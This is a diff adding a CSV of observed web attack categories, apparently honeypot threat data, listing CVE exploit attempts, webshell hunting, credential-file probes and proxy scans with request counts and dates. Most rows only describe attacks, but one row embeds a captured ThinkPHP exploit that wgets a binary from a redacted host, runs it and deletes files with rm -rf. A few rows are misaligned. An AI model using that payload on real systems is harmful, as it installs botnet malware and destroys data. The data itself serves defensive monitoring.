@@ -1,0 +1,305 @@
+category,details,urls,requests,first_seen,last_seen
+./supervisor/info,Data Leakage,2,0,,2026-05-14
+0,WordPress,1,0,,2013-08-28
+0,Wordpress,1,0,,2013-08-28
+Apache,CVE-2021-41773 directory traversal,4,119299,2021-11-20,2026-10-25
+Apache Solr,possible exploit or recon for Apache Solr,725,2132564,2019-09-25,2026-10-25
+Apache Status,None,1,194618,2014-12-02,2026-10-22
+Arbitrary File Read,exposed JPGraph example source view script allows arbitrary file read (DocumentRoot Confusion),2,55,2024-09-03,2024-09-05
+Arbitrary File Viewing,Paypal Currency Converter Basic For Woocommerce File Read CVE-2015-5065,4,436,2015-10-05,2026-10-18
+Atlassian,CVE-2023-22518,3,30642,2023-11-02,2026-10-24
+Auth Bypass,"Ivanti Connect Secure, CVE-2023-46805 or CVE-2024-21887",277,184136,2024-01-17,2026-10-24
+Auth Bypass,Ivanti vTM Authentication Bypass  CVE-2024-7593,1,512,2024-08-06,2026-08-24
+Auth Bypass,Update Elasticsearch settings with PUT requests to this URL,1,1839,2024-01-06,2026-10-23
+Authentication Bypass,FreePBX authentication bypass to gain full admin access CVE-2014-7235,2,3552,2011-10-18,2026-10-24
+Authentication Bypass,ManageEngine ADSelfService Plus CVE-2021-40539,4,2363,2021-10-04,2026-10-22
+Authentication Bypass,SonicWall SonicOS management access SSLVPN vulnerability CVE-2024-40766,1,103407240,2025-04-22,2026-10-23
+Authentication Bypass,"Strapi CMS password reset vulnerability CVE-2019-18818, CVE-2019-19609",1,884,2023-03-21,2026-10-20
+Backdoor,Enables a simple shell listening on port 2222. Exploitable via netcat.,1,8103,2024-11-14,2025-08-18
+Backdoor,Fiberhome Router SR1041F RP0105 ssh root backdoor,1,78,2024-12-15,2024-12-15
+Backdoor,Leafmailer is often installed on compromised sites to allow easy spam sending.,43,1456,2021-08-16,2026-10-08
+Backdoor,Likely simple webshell,2,49,2024-09-24,2024-09-24
+Backdoor,PHPUnit Remote Code Execution (CVE-2017-9841),1,7219,2024-05-04,2024-10-23
+Backdoor,Possible PHP backdoor for remote access,4,8338,2023-08-11,2026-10-14
+Backdoor,possible backdoor at /shell,80328,2481876,2018-08-20,2026-10-25
+Backdoor,unspecified remote code execution backdoor / webshell,24177,706311,2018-09-10,2026-09-18
+Broken Access Control,CVE-2023-22515 Atlasian Confluence create Admin account without authorization,262,10110,2023-10-13,2026-10-24
+Broken Exploit,"Attempt to exploit WordPress vulnerability, but template variables are not replaced",37955,934831,2024-07-12,2026-10-24
+Bruteforce,Sonicwall SSLVPN CVE-2021-20016,1,62137401,2025-04-22,2026-09-03
+CMS Scan,None,1,613043,2011-07-30,2026-10-25
+CVE-2017-9841,PHPUnit remote code execution vulnerability,589,23778187,2017-04-07,2026-10-25
+Checkpoint VPN,CVE-2024-24919,1,9907,2024-05-29,2026-10-24
+Code Execution,PHPStorm IDE Debug Serivce can be used to execute code,1,299205,2018-07-08,2026-07-24
+Code Execution,Remote code execution vulneraiblity in Vacron NVR,42228,61205,2018-10-25,2024-07-09
+Code Execution,"Remote code execution. Seen in Mirai botnet, CVE-2016-200017",174,5399,2018-06-15,2024-04-10
+Code Execution,ThinkPHP <6.0.14 RCE,33,14294,2023-07-24,2026-09-06
+Code Execution,ThinkPHP Exploit Attempt (ancient vulns),14897,1666557,2018-12-17,2026-10-25
+Coldfusion,None,3933,66835,2011-10-24,2026-10-25
+Confluence,CVE-2023-22515 authentication vulnerability in Confluence Server and Data Center,1,3502,2023-10-21,2025-03-08
+Confluence,Confluence vulnerability CVE-2022-26134,164,467754,2022-06-04,2026-09-26
+Credential Leak,"Attempting to search for a file that contains environment variables, which in turn may leak credentials",1984,768763,2012-12-09,2026-10-25
+Credential Leak,"attempt to find wordpress configuration, which may leak credentials if present",735,144660,2012-05-16,2026-10-25
+Credential Leakage,hunting for files with environment variables,41,13619,2020-07-16,2026-10-22
+Credential Theft,This URL has not yet been assigned a category,370,6618825,2016-12-20,2026-10-25
+Credential Theft,attempt to find SQL backup files,629,6842,2016-12-21,2026-10-24
+Credential Theft,attempt to steal secrets kept in environment variables defined in .env files,2192,11363457,2018-06-17,2026-10-25
+Credential Theft,attept to read AWS credentials,48,1728308,2019-08-09,2026-10-25
+Credential Theft,attept to read docker app credentials,17,53486,2021-05-02,2026-10-25
+Credential Theft,attept to read environment variables which may contain credentials,437,3850824,2019-04-20,2026-10-25
+CrushFTP,CrushFTP scan. CVE-2025-31161,92,533,2025-04-11,2026-10-24
+CrushFTP,CrushFTP scan. Either CVE-2025-32102 or CVE-2025-31161,1,2568,2024-04-26,2026-10-24
+Data Leakage,Attempt to find git information,4383,263657,2011-09-16,2026-10-25
+Data Leakage,Attempt to read Git configuration file,41524,6879481,2011-08-19,2026-10-25
+Data Leakage,Attempt to read environmnet configuration file,343,23341,2022-02-05,2024-06-06
+Data Leakage,PHP Symphony Profiler allows access to secrets in debug mode (enabled by default),1,3694,2024-10-18,2025-09-24
+Data Leakage,Snapshot image leak from IP cameras without (or weak) authentication,3,13525,2013-01-13,2026-10-23
+Data Leakage,Snapshot image leak from IP cameras without (or weak) authentication e.g. Dahua cameras,6,3177,2019-03-21,2026-10-03
+Data Leakage,Symphony in dev mode will leak phpinfo/profiler data with credentials,3,594022,2020-06-04,2026-10-25
+Data Leakage,used in php to hold configuration data like possibly credentials,3,5832,2023-05-27,2026-10-25
+Data Leakage,used to hold configuration data like possibly credentials,1,180,2024-05-31,2026-08-17
+Date Leakage,attempt to find git information,1,38573,2013-07-30,2026-10-25
+Directory Traversal,Attempt to exploit unspecified directory traversal to reach Wordpress Admin page,912,1132,2024-05-31,2024-05-31
+Directory Traversal,CVE-2018-3760 Rails Asset Pipline Directory Traversal Vulnerability,8,855,2020-12-28,2026-08-29
+Exchange / OWA,This URL has not yet been assigned a category,34,5604967,2011-11-19,2026-10-25
+Exposed Secrets,Attempt to find configuration files for Redmine project management web application,2,68,2024-09-03,2025-09-01
+F5 BIG-IP,CVE-2022-1388,15,18739,2021-09-23,2026-10-24
+File Upload,Apache Struts2 below 6.4.0   CVE-2023-50164 and  CVE-2024-53677,1,697,2024-12-15,2025-10-22
+File Upload,Appears to be looking for Netscaler devices to upload spam pages,1,4299,2020-10-27,2026-10-20
+File Upload,"CVE-2011-4275, CVE-2009-4140 OpenEMR 4.1.1 (ofc_upload_image.php) Arbitrary File Upload Vulnerability",1,23,2020-07-08,2025-07-07
+File Upload,attempt to exploit a misconfigured filemanager component in CKeditor,2101,28180,2011-08-15,2026-10-24
+File Upload,exploit attempt for jQuery-File-Upload,15,172,2022-05-18,2026-07-13
+File Upload,jQuery File Upload 9.22 CVE-2018-9206,954,12005,2015-05-09,2026-10-23
+Fortinet,CVE-2022-40684 Fortinet Appliance Auth bypass,1,4518,2022-10-14,2026-10-24
+IdeaCMS,IdeaCMS SQL Injection,2,583,2025-07-18,2026-10-21
+Information Disclosure,Information Disclosure Vulnerability in PHP Debug Bar. No CVE,1,3909,2021-06-10,2026-10-18
+Information Disclosure,Java (Tomcat/Jetty) deployment descriptor leaks config details,5629,281149,2013-01-03,2026-10-24
+Information Leak,Old (2002?) Cisco Vulnerability  iOS 11.2,1,184,2020-12-03,2024-12-12
+Information Leakage,Attempt to read a configuration file,426,380394,2011-08-13,2026-10-25
+Information Leakage,attempt to access .env file,2922,1804088,2018-09-30,2026-10-25
+Information Leakage,attempt to access environment variables,1,33050,2024-09-11,2026-09-28
+Information Leakage,shell scripts are often used to set environment variables. They script itself will contain secrets in clear text.,17,503,2024-10-22,2026-06-29
+IoT,"Blue Angel Software Suite - Authenticated Command Execution using common/default credentials (2019, no CVE) embeded voip devices",1,1638,2020-07-17,2026-08-04
+IoT,CVE 2007-3010 Alcatel-Lucent OmniPCX Enterprise - masterCGI Arbitrary Command Execution,1,143,2025-01-22,2025-01-22
+IoT,"CVE-2013-2578 TP-Link IP Cameras and others, e.g. Beward N100 cameras",2,95,2020-07-04,2026-02-23
+IoT,CVE-2014-8361 Realtek SDK,1,1523,2020-07-17,2026-10-23
+IoT,CVE-2017-16959 TPLink Local Path Disclosure,13,50103,2013-03-07,2026-10-25
+IoT,"CVE-2017-8225, WIFICAM (goahead web server) configuration leak",1,2057,2021-09-02,2026-03-11
+IoT,CVE-2018-10561,1,1050282,2018-05-07,2026-10-25
+IoT,CVE-2018-10823 DLink Router Exploit,19,759,2021-01-14,2026-10-22
+IoT,CVE-2018-20841 HooToo TripMate Titan HT-TM05 HT05 router remote command execution,5,38,2019-11-06,2024-08-05
+IoT,"CVE-2023-1389, possibly other CVEs as well",83,62295,2024-04-19,2026-07-03
+IoT,Cisco VoiP adapter SPA122 configuration file retrieval attempt,1,622,2018-05-22,2022-05-27
+IoT,DLink command injection via passwordless messagebus account,88,130557,2024-04-07,2026-10-23
+IoT,Elr D1000 router WAN side remote command injection used by Mirai/Mozi/Gafgyt bots,1,178663,2016-12-04,2026-10-25
+IoT,FreePBX scan. Multiple vulnerablities,1,182128,2018-05-23,2026-10-24
+IoT,HiSilicon hi3520d password disclosure,1,1955,2022-05-11,2022-12-02
+IoT,Hikvision IP Camera password reset brute force,1,3071,2018-11-02,2025-04-26
+IoT,Home Network Admin Protocol used bymisc IPSs to manage CPE. multiple vulnerabilities,1,1127654,2012-05-15,2026-10-25
+IoT,JAWS Webserver unauthenticated shell command execution used by Mirai/Mozi/Gafgyt bots,18834,271893,2019-07-17,2025-05-19
+IoT,Looking for Cisco VoIP adapter configuration files,38,586,2018-05-10,2026-05-26
+IoT,"Mimosa B5, B5c, and C5x firmware through 2.8.0.2 allows authenticated command injection CVE-2020-25206",1,23,2025-04-28,2025-04-28
+IoT,"Netgear DGN Setup.cgi remote code execution often used by Mozi, Mirai and similar bots",53536,356846,2016-03-03,2024-07-09
+IoT,Netgear cgi-bin Command Injection used by Mirai/Mozi/Gafgyt bots.,1,14,2019-11-01,2023-06-23
+IoT,Netgear router vulnerability. no CVE,287122,790701,2019-11-21,2026-10-25
+IoT,Netlink and other routers brute force default credentials,5,2115223,2020-09-18,2026-10-25
+IoT,Obfuscated attempt to access get_ipc_params.cgi used by various IP cameras,1,4133,2022-08-11,2025-04-26
+IoT,"Possible Netwave IP camera exploit, but others are possible. CVE-2018-11654",1,1468,2013-04-05,2026-10-21
+IoT,Possibly different ABUS security camera exploits e.g. CVE-2023-26609,15,513,2015-07-12,2026-08-24
+IoT,STALKER IPTV Vulnerability (2016),2,595,2020-12-04,2022-05-25
+IoT,Scan for Luci router admin,1,8123,2023-12-26,2026-10-13
+IoT,Schneider Electric Directory traversal & Broken Authentication no CVE. URL leaks details.,1,967,2024-09-03,2024-09-18
+IoT,SmartRG Router SR510n RCE CVE-2022-37661,1,253,2022-11-24,2025-09-30
+IoT,Solarview Compact CVE-2022-29303,6,1156,2022-08-04,2026-10-20
+IoT,Stalker Portal / Ministra IPTV set top boxes remote login and multiple unpatched vulns.,7,81261,2016-12-28,2026-10-23
+IoT,TOTOLINK A7000R access control problem CVE-2022-32993,1,1448,2020-07-16,2026-10-25
+IoT,Vacron NVR RCE (no CVE),32716,103851,2017-10-20,2026-10-25
+IoT,Various router vulnerabilities. For example CVE-2023-1389 TP-Link Archer AX21,355,1649441,2023-04-12,2026-10-24
+IoT,"Zyxel Firewall, possibly CVE-2022-30525",4,3275,2022-05-14,2026-10-24
+IoT,http://plugins.openvas.org/nasl.php?oid=803720,1,5609,2016-04-21,2026-10-18
+IoT,obfuscated attempt to access get_ipc_status.cgi used by various IP cameras. Recon,1,3948,2022-08-11,2025-04-26
+IoT,possible AVTech IP Camera vulnerability,31,5905,2017-02-14,2026-10-21
+Ivanti Auth Bypass,CVE-2023-35082,1,70,2025-12-01,2026-01-21
+JBoss,CVE-2017-12149,1,1203289,2017-12-02,2026-10-24
+JBoss,https://www.acunetix.com/vulnerabilities/web/jboss-httpadaptor-jmxinvokerservlet,1,57541,2011-12-22,2026-10-25
+Jenkins,https://jenkins.io/blog/2015/11/06/mitigating-unauthenticated-remote-code-execution-0-day-in-jenkins-cli/,1,6375,2015-04-18,2026-10-25
+Local File Incusion,CVE-2021-36749: Apache Druid: The HTTP inputSource allows authenticated users to read data from other sources than intended (incomplete fix of CVE-2021-26920),1,594,2022-03-20,2026-10-21
+Local/Remote file read,jFeed jQuery parser plugin includes a proxy.php script for debugging that can act be abused to read arbitrary local files or for SSRF,2,54,2024-09-03,2024-09-05
+Log4j,Log4j exploit attempt,1,88,2025-03-25,2025-03-26
+Medical,arbitrary file upload in OpenEMR 4.1.1 (electronic medical records),192,1732,2013-04-15,2026-06-09
+NTFS Alternate Data Stream,Attempt to bypass filters by using NTFS Alternate Data Streams,152,31324,2012-12-30,2026-10-24
+OGNL Injection,Nashorn/Confluence OGNL Injection vulnerability,30,241065,2023-01-30,2025-12-27
+OS Command Injection,"CVE-2020-15227, Vulnerability in Nette PHP Framework",16,1638,2020-10-12,2026-10-22
+OS Command Injection,"CVE-2020-25206 Mimosa B5, B5c, and C5x firmware through 2.8.0.2 allows authenticated command injection",1,15,2024-12-16,2024-12-16
+OS Command Injection,CVE-2024-3721  TBK DVR-4104 and DVR-4216 up to 20240412,1,38,2024-12-15,2024-12-15
+OS Command Injection,TBK DVR-4104 and DVR-4216 up to 20240412  CVE-2024-3721,1,23,2024-12-16,2024-12-16
+OS Command Injection,Telesquare SDT-CW3B1 1.1.0 - OS Command Injection CVE-2021-46422,1,32,2024-10-30,2024-10-30
+PHP MyAdmin,None,12,204895,2011-07-28,2026-10-22
+PHP MyAdmin,scan for PHP MyAdmin RCE CVE-2009-1151,3,34148,2011-07-29,2026-10-24
+PHP MyAdmin,scanning for phpmyadmin,227681,3026607,2011-08-09,2026-10-25
+PHPMyAdmin,searching for exposed PHP MyAdmin servers,14664,14904928,2011-07-29,2026-10-25
+Path Traversal,Unspecified Path Traversal Vulnerability,3014,15366,2022-07-23,2026-05-26
+Path Traversal,Unspecified Path Traversal Vulnerablity,31127,169148,2022-07-07,2026-10-17
+Plesk,None,160,2475,2011-10-24,2026-10-18
+Proxy,Attempt to connect to facebook's graph API via an open proxy,1,22219,2025-02-04,2025-03-20
+Proxy,Attempt to find open proxies,8,292986,2024-03-19,2024-03-28
+Proxy Attempt,Attempt to reach  login.microsoftonline.com via open proxies,1,15,2024-09-29,2025-11-06
+Proxy Attempt,fingerprint.scrapoxy.io does not appear to be reachable right now,1,6636,2024-11-18,2024-11-18
+Proxy Scan,Attempt to connect to site via open proxy,8,467,2017-07-11,2024-09-03
+Proxy Scan,Attempt to identify external IP and ability to proxy via myexteranlip.cpm,2,178,2016-06-23,2025-10-08
+Proxy Scan,Attempt to reach site via proxy,11853,11165049,2011-09-30,2026-10-24
+Proxy Scan,Attempt to use open Proxy,1,184,2024-10-20,2024-10-22
+Proxy Scan,Attempting to connect to server via proxy,4758,1921174,2018-10-08,2024-07-09
+Proxy Scan,None,6,984896,2013-10-28,2022-02-03
+Proxy Scan,Proxy Scan to various IP addresses.,1,4689,2020-01-21,2025-09-27
+Proxy Scan,This URL has not yet been assigned a category,27,5688,2018-01-07,2026-08-24
+Proxy Scan,attempt to connect to a site via open proxies,5,852,2021-12-08,2021-12-10
+Proxy Scan,attempt to connect to a site via open proxies.,3,369,2021-12-09,2021-12-10
+Proxy Scan,attempt to connect to site via open proxies,2,393,2021-12-08,2021-12-10
+Proxy Scan,trying to connect to 45.81.235.214:4444 (maybe metasploit?) via open proxy,1,456,2021-12-12,2021-12-13
+Proxy Test,Test if target is a proxy.,3,199,2024-08-28,2024-08-29
+Proxy Test,attempt to connect to query.cleaning via open proxies,2,2060,2022-08-02,2024-09-20
+RCE,"A2billing 2.x , Unauthenticated Backup dump / RCE flaw",1,15,2025-04-12,2025-04-12
+RCE,AXIS Camera SSI Remote Execute and Read Files. no CVE. fixed Q3/2016,20,3262,2020-02-20,2024-09-26
+RCE,CVE-2012-2626 Plixer Scrutinizer NetFlow and sFlow Analyzer HTTP Authentication Bypass,1,17,2024-10-01,2024-10-01
+RCE,CVE-2019-10647 ZZZCMS zzzphp v1.6.3 allows remote attackers to execute arbitrary PHP code,1,187,2024-11-26,2026-10-19
+RCE,CVE-2019-3396 The Widget Connector macro in Atlassian Confluence Server remote code execution,1,28623,2021-12-20,2026-10-24
+RCE,CVE-2022-26134 Atlassian Confluence OGNL Injection Remote Code Execution,1,14,2024-09-29,2024-09-30
+RCE,CVE-2024-36401 Remote Code Execution (RCE) Vulnerability In Evaluating Property Name Expressions (Geoserver),2,3609,2024-09-18,2024-09-19
+RCE,CVE-2024-4577 PHP cgi-bin remote code execution via Chinese/Japanese code page,4,28296,2024-06-11,2026-10-15
+RCE,CVE-2024-7120 RAISECOM Gateway Devices comand injection vulnerability,1,63,2024-09-12,2024-09-12
+RCE,Cacti v1.2.8 - Unauthenticated Remote Code Execution  CVE-2020-8813,1,740,2021-09-11,2026-10-20
+RCE,Confluence CVE-2022-26134,1,44,2024-09-12,2024-09-12
+RCE,D-Link DNS-320L & DIR-327L RCE,1,19,2024-10-21,2024-10-23
+RCE,FOGProject 1.5.9 - File Upload RCE (Authenticated),1,5400,2020-07-01,2026-10-18
+RCE,Genexis PLATINUM 4410 router CVE-2021-29003.,1,480,2025-11-23,2026-01-04
+RCE,GeoServer vulnerabilities CVE-2024-36401 possibly others,1,18304,2024-07-03,2026-10-23
+RCE,High severity RCE (Remote Code Execution) vulnerability was introduced in version 5.2 of Confluence Data Center and Server CVE-2024-21683,2,966,2024-05-23,2024-09-24
+RCE,Netgear DGN1000/GDN20000v1 OS command injection vulnerablity,270,27991,2019-02-12,2024-09-20
+RCE,Netgear OS Command Injection CVE-2016-1555,1,64,2024-10-21,2024-10-23
+RCE,PHP CGI exploit CVE-2024-4577,6,5089,2024-06-09,2026-06-07
+RCE,PHPUnit Remote Code Execution (CVE-2017-9841),1,7817,2024-05-04,2024-10-23
+RCE,Prolink PRC2402M router  CVE-2021-35402,1,96,2025-03-25,2025-03-25
+RCE,"QNAP QTS command injection exploit. CVE-2017-6361, CVE-2017-6360 and others",1,1076963,2014-09-22,2026-10-25
+RCE,SDT-CW3B1 1.1.0 - OS command injection CVE-2021-46422,1,2268,2023-06-14,2026-10-21
+RCE,TBK DVR-4104 and similar DVRs os command injection CVE-2024-3721,1,64,2025-03-24,2025-03-28
+RCE,"The porte_plume plugin used by SPIP before 4.30-alpha2, 4.2.13, and 4.1.16 is vulnerable to an arbitrary code execution vulnerability",1,1349,2024-09-20,2026-10-21
+RCE,Unauthenticated RCE via Angular-Base64-Upload CVE-2024-42640,1,3112,2024-10-14,2024-10-14
+RCE,"WIREFIRE webshell Ivanti Connect Secure, CVE-2023-46805 and CVE-2024-21887",1,3567145,2024-01-16,2026-02-17
+RCE,XWiki Database Search code execution  CVE-2024-31982,1,25,2024-06-26,2025-03-22
+RCE,unauthenticated command injection vulnerability ZeroShell 3.9.0 2019-12725,1,23,2024-12-16,2024-12-16
+Recognizance,Search for WatchGuard VPN Servers.,1,44378,2021-11-30,2026-10-24
+Recon,Cisco ASA WebVPN Login Page,2,230780,2018-02-15,2026-10-25
+Recon,CloudFlare Debug/Trace Output,12,114008,2019-08-26,2026-10-23
+Recon,Java Script Recon,1,154,2025-05-29,2025-05-30
+Recon,Jenkins user enumeration,1,45425,2019-03-22,2026-09-03
+Recon,Maybe attempt to find Apache Guacamole remote access gateway,1,13446,2023-03-01,2026-05-20
+Recon,Possible fingerprinting for Digiever NVR,1,17,2024-11-15,2024-11-16
+Recon,Possibly attempt to find Joomla! Component FacileForms 1.4.4 - Remote File Inclusion for CVE-2008-2990 exploitation,1,41,2016-09-05,2025-10-28
+Recon,Rails application database configuration,1,492,2024-07-07,2025-02-23
+Recon,Recon for Strapi CMS Version,1,697,2022-02-23,2026-10-22
+Recon,Scan for Atlassian Confluence  CVE-2022-26134,1,843,2024-10-05,2025-04-22
+Recon,Scan for ESAFENET CDG V5. Various vulnerabilities e.g.  CVE-2024-46510,1,2972,2023-10-07,2026-10-23
+Recon,Searching for Symphony profile which may allow code exec in debug mode,1,251,2025-03-24,2025-09-16
+Recon,Symphony PHP Frontend developer mode,1,372,2022-06-05,2026-05-09
+Recon,Tomcat Java Management Extension proxy.,1,400,2024-10-29,2026-04-15
+Recon,attempt to find xml-rpc endpoints.,1,10883,2011-10-10,2026-10-20
+Recon,attempt to read Word Press configuration,1,2210,2022-10-14,2026-10-25
+Recon,check if WinRM service is listening,1,2616316,2012-11-02,2026-10-25
+Recon,searching for Remote Desktop Gateway,496,61729,2013-04-17,2026-10-25
+Remote Code Execution,"CVE-2020-9054, ZyXEL NAS Device Remote Code Execution",38,2550,2020-04-19,2026-10-22
+Remote Code Execution,CVE-2024-3273 D-Link NAS,8,2525,2024-05-07,2024-10-02
+Remote File Inclusion,CowEdit file include,1,1,2014-11-10,2014-11-10
+SQL Injection,GeoServer SQL Injection CVE-2023-25157 CVE-2023-25158,136,543963,2020-09-22,2026-10-25
+SQL Injection,Multiple SQL Injection Vulnerabilities in Magento. For example CVE-2019-7139,1,368,2019-04-02,2025-08-01
+SQL Injection,Schneider Electric U.motion Builder CVE-2018-7765,1,262,2020-07-04,2026-10-24
+SQL Injection,taifajobs 1.0 SQL Injection,347,1417,2020-07-01,2026-10-18
+SSRF,SSRF in Liferay portal-settings-authentication-opensso-web CVE-2025-4581,1,352,2025-07-13,2025-09-10
+SharePoint,Possible SharePoint attack like for example CVE-2025-53770 and CVE-20215-53771 as well as related webshells,123,671366,2012-09-04,2026-10-25
+Sophos Firewall RCE,CVE-2022-1040,7,806,2022-05-15,2026-10-18
+Struts2,devmode feature enabled allows OGNL injection,2422,3089,2020-08-17,2026-10-22
+Struts2 Log4j RCE,CVE-2021-44228 - recon ahead of exploit attempt,1,2741,2021-12-12,2026-10-18
+ThinkPHP,ThinkCMF (Chinese ThinkPHP clone) vulnerability,2,67,2019-11-01,2021-11-20
+ThinkPHP,ThinkPHP 5.x Rmeote Command Execution Exploit,2,2,2021-09-24,2021-09-24
+Tomcat,None,1,1708818,2011-08-12,2026-10-25
+UNION,SELECT,1,0,,
+Undefined,Not enough detail to identify attack based on URL,1,57045,2018-01-28,2026-06-29
+VMWare,Possible exploit for CVE-2022-22972,1,904,2021-08-12,2026-10-18
+VMWare,VMWare Session API. Could be used for recon,1,433,2023-02-25,2026-10-22
+VPN,Fortigate SSL VPN CVE-2018-13379,5,102124,2020-06-04,2026-10-24
+VPN,Fortigate SSL VPN CVE-2018-13382,1,19812982,2021-08-12,2026-10-24
+WebLogic,Attempt to Exploit CVE-2020-14882,1,26899,2020-11-02,2026-08-30
+Webshell,Ani-Shell.php backdoor / webshell,5,167,2021-12-06,2021-12-06
+Webshell,G00nshell backdoor / webshell,5,163,2021-12-06,2021-12-06
+Webshell,"Hunting for ""/shell"" unprotected webshells",1,683,2024-10-29,2024-10-29
+Webshell,Loaderz backdoor / webshell,9,215,2021-12-06,2026-06-29
+Webshell,PHPSpy backdoor / webshell,5,331,2021-12-06,2021-12-06
+Webshell,Simple PHP backdoor / webshell,8,181,2021-12-06,2021-12-06
+Webshell,c99 PHP backdoor / webshell,6,209,2021-12-06,2021-12-06
+Webshell,c99_locus7s backdoor / webshell,5,182,2021-12-06,2021-12-06
+Webshell,webshell used to execute commands on compromised webserver,7,3761,2014-10-07,2024-07-16
+WordPress,Attempt to find git information,4,40,2012-02-28,2025-10-05
+WordPress,Attempt to read Git configuration file,89,6677,2021-01-25,2026-10-08
+WordPress,Attempt to read a configuration file,3,6,2023-08-13,2023-09-03
+WordPress,Leafmailer is often installed on compromised sites to allow easy spam sending.,4,29,2022-06-21,2025-12-19
+WordPress,None,185880,3986942,2021-12-01,2026-10-25
+WordPress,PHPUnit remote code execution vulnerability,13,55704,2018-03-28,2026-10-23
+WordPress,Plupload plugin has various vulnerabilities. Most recent CVE-2021-23562,286,3434,2013-02-18,2026-10-18
+WordPress,SQLite Manager Web Interface (https://osdn.net/projects/sfnet_sqlitemanager/),12,48,2022-09-01,2023-08-20
+WordPress,This URL has not yet been assigned a category,19086,1570249,2011-08-03,2026-10-25
+WordPress,arbitrary file upload in OpenEMR 4.1.1 (electronic medical records),19,224,2013-04-15,2026-06-09
+WordPress,scanning for WordPress vulnerabilities,1,7,2021-12-09,2021-12-09
+WordPress,scanning for WordPress vulnerabilities. Possible authentication bypass in User Registration Plugin  CVE-2021-4073,2,12,2021-12-08,2021-12-09
+WordPress,scanning for WordPress vulnerabilities. checking for capability manager enhanced plugin.,1,16,2021-12-07,2021-12-18
+WordPress,scanning for WordPress vulnerabilities. checking for the capabilities-pro plugin.,1,14,2021-12-07,2021-12-18
+WordPress,scanning for WordPress vulnerabilities. possible super cache plugin vulnerability CVE-2021-24209,1,5,2021-12-09,2021-12-09
+WordPress,scanning for Wordpress/Plugin vulnerabilities,1,1,2016-11-17,2016-11-17
+WordPress,scanning for phpmyadmin,29,100,2022-08-21,2024-12-05
+WordPress,searching for exposed PHP MyAdmin servers,14,5985,2020-03-19,2023-09-22
+Wordpress,"Attempt to Exploit Wordpress Plugin ""Asset Manager""",1,206,2012-09-06,2026-10-18
+Wordpress,scanning for Wordpress/Plugin vulnerabilities,20856,752755,2011-07-31,2026-10-25
+broken,looks like a broken proxy attempt,2,494,2022-01-09,2022-06-14
+broken tool,SSH client connecting to web server,1,1840,2021-11-30,2021-11-30
+data leakage,Attempt to discover environment varialbes and secrets in env_example file,1,13505,2024-01-30,2026-10-25
+data leakage,Possible leaking of configuration information including credentials.,1,23,2024-10-19,2026-09-18
+failed exploit,possible SSH connection to a web server,1,139,2024-05-21,2024-10-03
+hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl cd /tmp; wget http://[redacted]/bin/Polar.mips; chmod 777 *; ./Polar.mips yarn; rm -rf *,Code Execution,2,0,,2025-11-23
+injection,Checkpoint Firewall. Possible XPath Injection,1,849765,2024-06-16,2026-10-24
+invalid exploit,Typo in exploit. Attempt to exploitTP-Link Archer AX21 (and likely others using luci) command injection. CVE-2023-1389,1,73,2023-07-04,2025-04-26
+invalid exploit,"attempt to exploit Totolink-A810R-downloadFile.cgi-Vulnerability but ""File"" misspelled.",1,1375,2025-03-25,2025-03-25
+log4j,None,38214,65800,2021-12-15,2026-10-24
+log4j,attempt to exploit log4j JDNI vulnerability CVE-2021-44228,1013,5268,2021-12-10,2022-01-02
+log4j,log4j vulnerability CVE 2021-44228,291,5412,2021-12-14,2022-01-02
+log4j,obfuscated log4j exploit attempt,66,10124,2021-12-12,2026-05-30
+no attack,Letsencrypt validation,2519,10716,2017-06-15,2026-10-24
+no attack,None,12,9954819,2011-07-27,2026-10-25
+no attack,TLS conneciton to  non TLS server,4,811,2021-12-30,2024-03-19
+no attack,This URL has not yet been assigned a category,1002,6495,2011-07-27,2014-12-17
+no attack,Weblogic connection attempt (maybe recon),2,203,2021-12-06,2026-10-13
+no attack,attempt to connect to http server via TLS,1,192,2021-12-28,2022-03-09
+no attack,attempt to connect to non TLS server with TLS,23,3908,2021-11-12,2026-10-18
+no attack,file used to communicate security contact information,1,526166,2018-01-04,2026-10-25
+path traversal,OFBiz path traversal vulnerability CVE-2024-31223,1,3993,2024-06-13,2025-08-08
+php,PHPFusion 9.03.50 RCE Vulnerability CVE-2020-24949,2,874,2021-09-16,2026-10-22
+proxy attempt,attempt to proxy to Microsoft's OAuth endpoint. Maybe brute forcing?,1,395,2024-09-29,2024-11-19
+recon,F5 Big IP REST Authentication Endpoint,19,4301,2021-09-06,2026-10-24
+recon,Likely recon attempt. Possible encoding of source IP (sip) or random string in hex to distinguish requests,4,7,2021-09-11,2026-06-29
+recon,ManageEngine ADSelfService Plus 6.1 - User Enumeration,1,276,2026-01-29,2026-10-20
+recon,Ministra (aka Salkter) TV Set top boxes,1,2641,2016-11-24,2026-08-12
+recon,None,1,35596132,2011-07-29,2026-10-25
+recon,Not enough detail to identify attack based on URL,52,239491261,2011-07-27,2026-10-25
+recon,SQLite Manager Web Interface (https://osdn.net/projects/sfnet_sqlitemanager/),1238,46941,2013-10-04,2026-10-24
+recon,Searching for JSPAdmin (JSP frontend for MySQL),1,144,2021-11-29,2026-10-18
+recon,Searching for Swagger2 APIs,17,130664,2020-12-28,2026-10-25
+recon,Trying to look for Cisco ASA devices,28,5707,2018-06-29,2026-10-23
+recon,attempt to get server details for 404 errors,1,294,2021-06-27,2026-10-22
+recon,likely looking for 404 errors to determine server version,1,16,2021-11-30,2021-11-30
+recon,likely recon attempt. the URL may encode the source ip (sip) to distinguish requests or connect responses to requests,117,6023,2024-02-20,2024-07-29
+recon,likely search for Cisco UCS Dashboard,1,717,2020-07-01,2026-10-18
+recon,searching for Springfox / Swagger2 APIs,1,9282,2021-03-02,2026-10-25
+recon,searching for login page,1,142332,2011-10-24,2026-10-25
+recon,searching for openapi/swagger endpoints,1,2123,2021-12-15,2026-10-16
+recon,searching for tgbot Telegram bot,1,102,2021-12-15,2021-12-27
+recon,used to find exchange servers (possible tool: proxyshell-recon),480,20474,2021-08-10,2026-10-25
+undefined,This URL has not yet been assigned a category,6,782571,2011-09-06,2026-10-18
+webshell,Ajax PHP Command Shell webshell/backdoor,6,206,2021-12-06,2026-06-29
+webshell,shell.jsp is often associated with the spring4shell vuln. in particular if a pwd and cmd parameter is used,9,121,2019-11-07,2026-05-10
